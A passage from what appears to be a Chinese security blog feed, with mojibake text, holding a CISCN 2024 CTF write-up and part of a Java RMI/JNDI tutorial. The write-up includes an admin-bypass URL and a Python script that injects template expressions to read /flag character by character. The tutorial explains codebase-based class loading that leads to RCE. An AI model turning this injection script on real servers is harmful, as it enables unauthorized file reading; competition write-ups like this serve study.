´<br></code></pre></td></tr></table></figure><p>çœ‹èµ·æ¥è¿˜æŒºç®€å•ï¼Œä½†æ˜¯æ–­ç½‘ç¯å¢ƒç¡®å®å¾ˆæŠ˜ç£¨ï¼Œæ€»æœ‰é‚£ä¹ˆå‡ ä¸ªç¯å¢ƒé—®é¢˜ï¼Œè€Œä¸”å®¡è®¡éœ€è¦é è‡ªå·±ï¼Œæ¯”èµ›ä¹Ÿå¾ˆç´§å¼ ï¼Œæ‰€ä»¥åšå‡ºæ¥çš„äººç¡®å®å¾ˆç‰›è‡³äº†ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>è¿™é‡Œæˆ‘åœ¨vpsä¸Šè‡ªæ­ç¯å¢ƒæµ‹è¯•ï¼š</p><p>å…ˆadminç»•è¿‡ï¼Œä½†æ˜¯è¦urlç¼–ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">&lt;url&gt;/?username=adm%C4%B1n<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003302893.png" alt="image-20240728003302893"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>hash_string = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100000</span>):<br>    payload = base64.b64encode((<span class="hljs-string">&#x27;$&#123;@java.util.Arrays.toString(@org.antlr.v4.runtime.misc.Utils.readFile(&quot;/flag&quot;)).charAt(&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;)&#125;&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    rsp = requests.get(<span class="hljs-string">f&#x27;http://vps:8888/render?pass=FuTKLliOry&amp;tp=<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>)<br>    soup = BeautifulSoup(rsp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    md5_element = soup.select_one(<span class="hljs-string">&#x27;div#title-desktop&#x27;</span>)<br>    <span class="hljs-keyword">if</span> md5_element <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        md5val = md5_element.text<br>        <span class="hljs-built_in">print</span>(md5val)<br>        hash_string.append(md5val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>hash_string = <span class="hljs-string">&#x27;\n&#x27;</span>.join(hash_string)<br><br><span class="hljs-built_in">map</span> = <span class="hljs-built_in">dict</span>()<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:<br>    <span class="hljs-built_in">map</span>[hashlib.md5(c.encode()).hexdigest()] = c<br><br>val = hash_string.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(val))<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> cc <span class="hljs-keyword">in</span> val:<br>    <span class="hljs-keyword">if</span> cc <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        flag += <span class="hljs-built_in">map</span>[cc]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>ç„¶åè¯»æ–‡ä»¶ä¸€ä¸ªä¸ªå­—ç¬¦MD5çˆ†ç ´ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003427355.png" alt="image-20240728003427355"></p><p>åœ¨æ­¤ä½©æœä¸€ä¸‹å­¦é•¿çš„ç‰›è‡³åšæ³•ï¼Œæ¯”èµ›åœºä¸Šä¿©å­¦é•¿éƒ½ç”¨ç±»ä¼¼è¿™ç§æ–¹æ³•åšçš„ï¼Œéƒ½tql~~~orz</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2024/07/18/RMI-JNDI/"/>
    <url>/2024/07/18/RMI-JNDI/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆäº†è§£ä¸€ä¸‹å•¥æ˜¯RMIã€‚</p><p><code>RMIï¼šRemote Method Invocation</code> è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">RMIä¸ºåº”ç”¨æä¾›äº†è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼ˆJavaçš„RPCæ¡†æ¶ï¼‰<br>è°ƒç”¨è¿œç¨‹ä½ç½®å¯¹è±¡çš„æ–¹æ³•<br>å®ç°RMIçš„åè®®å«JRMP<br>RMIå®ç°è¿‡ç¨‹å­˜åœ¨Javaå¯¹è±¡çš„ä¼ é€’ï¼Œå› æ­¤æ¶‰åŠåˆ°ååºåˆ—åŒ–<br></code></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šä»javaååºåˆ—åŒ–å–ç»å‡ºæ¥ï¼Œé‡åˆ°ä¸”ç»•ä¸å¼€çš„åº”è¯¥æ˜¯å„ä¸ªCCé“¾ï¼Œè€Œä¸”å¾ˆå¤šçš„javaååºåˆ—åŒ–éå¸¸å…·æœ‰ç¼åˆæ€ªçš„é£æ ¼ï¼Œåœ¨å‰æœŸå­¦ä¸šå‹åŠ›ä¸‹æ²¡åŠæ³•ç³»ç»Ÿå½’çº³ï¼ŒçŸ¥è¯†ä¹Ÿé›¶é›¶æ•£æ•£ï¼Œè¿™é‡Œå°±åšä¸€ä¸ªç³»ç»ŸåŒ–çš„å¤ç›˜ã€‚</p><p>ä½†æ˜¯CCé“¾å¤ªå…·æœ‰ä»£è¡¨æ€§äº†ï¼Œæ‰€ä»¥æˆ‘æƒ³å…ˆå†™å†™æˆ‘ç¬¬ä¸€æ¬¡æ‰“åˆ°javaé¢˜çš„æ—¶å€™é‡åˆ°çš„RMI&#x2F;JNDIé—®é¢˜ï¼Œå°±æ˜¯NCTF2023çš„loggingç­¾åˆ°é¢˜ï¼Œé‚£é“log4jè™½ç„¶å¾ˆç®€å•åœ°æ‰“acceptå¤´å°±èƒ½RCEï¼Œä½†æ˜¯èµ·çš„å·¥å…·ä¹Ÿå°±æ˜¯JNDIæ³¨å…¥çš„å·¥å…·ï¼Œæ‰€ä»¥è®©æˆ‘è®°å¿†çŠ¹æ–°ã€‚</p><p>ç„¶è€Œå…‰é å·¥å…·å°å­å½“ç„¶æ˜¯ä¸èƒ½è§£å†³é—®é¢˜çš„ï¼Œå¤§å¤šæ˜¯çš„EXPéƒ½æ˜¯ç°åœºåŠ¨è°ƒè€Œæ‰‹å¯¼æ‰‹å†™ï¼Œè€Œä¸”çº¿ä¸‹æ–­ç½‘ç¯å¢ƒæ³¨å®šä¸èƒ½åå¼¹shellè€Œåˆ™å¿…é¡»ä½¿ç”¨å†…å­˜é©¬ä¹Ÿä½¿å¾—javaåœ¨webé¢˜å†…æœ€å°‘è§£çš„æƒ…å†µï¼Œå›½èµ›ä¹Ÿé‡åˆ°äº†è§¦ç›®æƒŠå¿ƒçš„é›¶è§£ã€‚åå°„å’Œç±»åŠ è½½æˆ‘å°±ä¸å†èµ˜è¿°ï¼Œå› ä¸ºè¿™ç®—æ˜¯æœ€åŸºæœ¬çš„javaååºåˆ—åŒ–å…¥é—¨çŸ¥è¯†ã€‚</p><p>ä¸ºå±è”½ç½‘ç»œé€šä¿¡çš„å¤æ‚æ€§ï¼ŒRMIå¼•å…¥ä¸¤ä¸ªæ¦‚å¿µï¼Œå®¢æˆ·ç«¯å­˜æ ¹Stubå’ŒæœåŠ¡ç«¯éª¨æ¶Skeleton</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">å½“<span class="hljs-variable">Client</span>è¯•å›¾è°ƒç”¨ä¸€ä¸ªè¿œç«¯çš„<span class="hljs-variable">Object</span>ï¼Œå®é™…è°ƒç”¨çš„æ˜¯å®¢æˆ·ç«¯æœ¬åœ°çš„ä¸€ä¸ªä»£ç†ç±»ï¼ˆå°±æ˜¯<span class="hljs-built_in">Stub</span>ï¼‰<br><br>è°ƒç”¨<span class="hljs-variable">Server</span>çš„ç›®æ ‡ç±»ä¹‹å‰ï¼Œä¼šç»è¿‡ä¸€ä¸ªè¿œç«¯ä»£ç†ç±»ï¼ˆå°±æ˜¯<span class="hljs-built_in">Skeleton</span>ï¼‰ï¼Œå®ƒä»<span class="hljs-built_in">Stub</span>æ¥æ”¶è¿œç¨‹æ–¹æ³•è°ƒç”¨å¹¶ä¼ é€’ç»™çœŸæ­£çš„ç›®æ ‡ç±»<br><br><span class="hljs-built_in">Stub</span>å’Œ<span class="hljs-built_in">Skeleton</span>çš„è°ƒç”¨å¯¹äº<span class="hljs-variable">RMI</span>æœåŠ¡çš„ä½¿ç”¨è€…æ˜¯éšè—çš„<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/1.png" alt="1"></p><p><img src="/2024/07/18/RMI-JNDI/2.png" alt="2"></p><p><strong>ä»£ç è§„åˆ™</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½éœ€å®šä¹‰ç”¨äºè¿œç¨‹è°ƒç”¨çš„æ¥å£<br><br>æ¥å£å¿…é¡»ç»§æ‰¿`java.rmi.Remote`æ¥å£<br><br>æ¥å£ä¸­çš„æ–¹æ³•éƒ½è¦æŠ›å‡º`java.rmi.RemoteException`å¼‚å¸¸<br><br>æœåŠ¡ç«¯åˆ›å»ºæ¥å£å®ç°ç±»ï¼Œå®ç°æ¥å£å®šä¹‰çš„æ–¹æ³•<br><br>å®ç°ç±»ç»§æ‰¿`java.rmi.server.UnicastRemoteObject`<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ±‚å®ç°ç±»ç»§æ‰¿<code>UnicastRemoteObject</code>ï¼Œæ–¹ä¾¿è‡ªåŠ¨å°†è¿™ä¸ªè¿œç¨‹å¯¹è±¡å¯¼å‡ºä¾›å®¢æˆ·ç«¯è°ƒç”¨</p><p>å½“ç„¶ä¸ç»§æ‰¿ä¹Ÿè¡Œï¼Œä½†åé¢å¾—æ‰‹åŠ¨è°ƒç”¨<code>UnicastRemoteObject#exportObject</code>ï¼Œå¯¼å‡ºå¯¹è±¡æ—¶å¯ä»¥æŒ‡å®šç›‘å¬ç«¯å£æ¥æ¥æ”¶<code>incoming calls</code>ï¼Œé»˜è®¤ä¸ºéšæœºç«¯å£ã€‚ç”±ä¸Šå›¾å¯çŸ¥è¿œç¨‹å¯¹è±¡ä¼šè¢«æ³¨å†Œåˆ°<code>RMI Registry</code>ä¸­ï¼Œæ‰€ä»¥å®é™…ä¸Šä¸éœ€è¦é€šè¿‡æ³¨å†Œä¸­å¿ƒï¼Œåªè¦æˆ‘ä»¬çŸ¥é“å¯¼å‡ºçš„è¿œç¨‹å¯¹è±¡ç›‘å¬çš„ç«¯å£å·ï¼Œä¹Ÿå¯ä»¥å’Œå®ƒç›´æ¥é€šä¿¡ã€‚</p><p><code>RMI Registry</code>æ³¨å†Œä¸­å¿ƒå­˜å‚¨ç€è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆReferenceï¼‰å’Œå…¶ç»‘å®šçš„åç§°ï¼ˆNameï¼‰ï¼Œå®¢æˆ·ç«¯é€šè¿‡åç§°æ‰¾åˆ°è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆReferenceï¼‰ï¼Œå†ç”±è¿™ä¸ªå¼•ç”¨å°±å¯ä»¥è°ƒç”¨åˆ°è¿œç¨‹å¯¹è±¡äº†ã€‚</p><h2 id="æ­¥éª¤ä»£ç "><a href="#æ­¥éª¤ä»£ç " class="headerlink" title="æ­¥éª¤ä»£ç "></a>æ­¥éª¤ä»£ç </h2><p><strong>Server</strong></p><p>éœ€è¦è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥å£å®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend&quot;</span>;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> name.getClass().getName();<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>LocateRegistry#createRegistry()</code> æ–¹æ³•æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br><span class="hljs-comment">// åˆ›å»ºè¿œç¨‹å¯¹è±¡</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br><span class="hljs-comment">// ç»‘å®š</span><br>Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/Hello&quot;</span>, remoteObject);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æ•´åˆåˆ°Serverå¤„æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œä½¿ç”¨<code>LocateRegistry#createRegistry()</code>æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼Œ<code>Registry#bind()</code>è¿›è¡Œç»‘å®šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Naming æä¾›äº†æŸ¥è¯¢ï¼ˆlookupï¼‰ã€ç»‘å®šï¼ˆbindï¼‰ã€é‡æ–°ç»‘å®šï¼ˆrebindï¼‰ã€æ¥è§¦ç»‘å®šï¼ˆunbindï¼‰ã€listï¼ˆåˆ—è¡¨ï¼‰ç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒNaming æ˜¯ä¸€ä¸ªç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œçš„ç±»ã€‚è€Œè¿™äº›æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œå…¶å®æ˜¯è°ƒç”¨ <code>LocateRegistry.getRegistry</code> æ–¹æ³•è·å–äº† Registry æ¥å£çš„å®ç°ç±»ï¼Œå¹¶è°ƒç”¨å…¶ç›¸å…³æ–¹æ³•è¿›è¡Œå®ç°çš„ã€‚</p><p>è¿™äº›æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ¥æ”¶ä¸€ä¸ªURLå­—ç¬¦ä¸²ï¼Œ<code>rmi://host:port/name</code>ï¼Œè¡¨ç¤ºæ³¨å†Œä¸­å¿ƒæ‰€åœ¨ä¸»æœºå’Œç«¯å£ï¼Œè¿œç¨‹å¯¹è±¡å¼•ç”¨çš„åç§°ã€‚</p><p>ä¸€èˆ¬æ³¨å†Œä¸­å¿ƒå’ŒæœåŠ¡ç«¯éƒ½åœ¨åŒä¸€ä¸»æœºã€‚</p><p><strong>Client</strong></p><p>å®¢æˆ·ç«¯ä¹Ÿéœ€è¦å®šä¹‰å’ŒæœåŠ¡ç«¯ç›¸åŒçš„è¿œç¨‹æ¥å£ï¼Œç„¶åè¿›è¡Œè°ƒç”¨ï¼š</p><p><code>LocateRegistry#getRegistry()</code>è¿æ¥æ³¨å†Œä¸­å¿ƒï¼Œ<code>Registry#lookup()</code>è·å–è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹ï¼Œé€šè¿‡åç§°æŸ¥æ‰¾ã€‚æ³¨å†Œä¸­å¿ƒé»˜è®¤ç«¯å£1099</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>System.out.println(Arrays.toString(registry.list()));<br><span class="hljs-comment">// lookup and call</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>System.out.println(stub.sayHello());<br>System.out.println(stub.sayGoodbye());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ RemoteInterface æ¥å£åœ¨ Client&#x2F;Server&#x2F;Registry å‡åº”è¯¥å­˜åœ¨ï¼Œåªä¸è¿‡é€šå¸¸ Registry ä¸ Server é€šå¸¸åœ¨åŒä¸€ç«¯ä¸Šã€‚</p><p>RMIæ”¯æŒåŠ¨æ€ç±»åŠ è½½æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚ä¸Šé¢çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æ¶‰åŠæ–¹æ³•å‚æ•°çš„ä¼ é€’ï¼Œè‹¥å®¢æˆ·ç«¯ä¼ é€’äº†ä¸€ä¸ªæœåŠ¡ç«¯ä¸å­˜åœ¨çš„ç±»å¯¹è±¡ï¼ŒæœåŠ¡ç«¯å¦‚ä½•è¿›è¡Œååºåˆ—åŒ–å‘¢ï¼Ÿ</p><p>æœ€åè¿˜æœ‰ä¸ªå°trickï¼Œé¦–å…ˆæ˜¯åŠ¨æ€ç±»åŠ è½½ï¼Œå¦‚æœå®¢æˆ·ç«¯åœ¨è°ƒç”¨æ—¶ï¼Œä¼ é€’äº†ä¸€ä¸ªå¯åºåˆ—åŒ–å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨æœåŠ¡ç«¯ä¸å­˜åœ¨ï¼Œåˆ™åœ¨æœåŠ¡ç«¯ä¼šæŠ›å‡º ClassNotFound çš„å¼‚å¸¸ï¼Œä½†æ˜¯ RMI æ”¯æŒåŠ¨æ€ç±»åŠ è½½ï¼Œè‹¥è®¾ç½®äº†<code>java.rmi.server.codebase</code>ï¼Œåˆ™æœåŠ¡ç«¯ä¼šå°è¯•ä»å…¶åœ°å€è·å– <code>.class</code> å¹¶åŠ è½½åŠååºåˆ—åŒ–ã€‚åŠ è½½å­—èŠ‚ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>æ‰€ä»¥ï¼Œæ‰“ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ¶æ„Serverç«¯å¯ä»¥å¦‚æ­¤å­˜æ”¾æ¶æ„classå­—èŠ‚ç ï¼Œè®©Clientæ¥è°ƒç”¨ä»è€ŒRCEã€‚</strong></p><p>å¯ä½¿ç”¨ <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</code> è¿›è¡Œè®¾ç½®ï¼Œæˆ–ä½¿ç”¨å¯åŠ¨å‚æ•° <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code> è¿›è¡ŒæŒ‡å®šã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å®‰å…¨ç­–ç•¥çš„è®¾ç½®ï¼Œå› ä¸ºæˆ‘ä»¬é€šè¿‡ç½‘ç»œåŠ è½½å¤–éƒ¨ç±»å¹¶æ‰§è¡Œæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¦æœ‰ä¸€ä¸ªå®‰å…¨ç®¡ç†å™¨æ¥è¿›è¡Œç®¡ç†ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å®‰å…¨ç®¡ç†ï¼Œåˆ™ RMI ä¸ä¼šåŠ¨æ€åŠ è½½ä»»ä½•ç±»ï¼Œé€šå¸¸æˆ‘ä»¬ä½¿ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>    System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RMISecurityManager</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®¡ç†å™¨åº”ä¸ç®¡ç†ç­–ç•¥ç›¸è¾…ç›¸æˆï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æä¾›ä¸€ä¸ªç­–ç•¥æ–‡ä»¶ï¼Œé‡Œé¢é…ç½®å…è®¸é‚£äº›ä¸»æœºè¿›è¡Œå“ªäº›æ“ä½œï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œç›´æ¥è®¾ç½®å…¨éƒ¨æƒé™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥ä½¿ç”¨ <code>-Djava.security.policy=rmi.policy</code> æˆ– <code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> æ¥è¿›è¡Œè®¾ç½®ã€‚</p><h2 id="RMIåº•å±‚åŸç†æ€»ç»“"><a href="#RMIåº•å±‚åŸç†æ€»ç»“" class="headerlink" 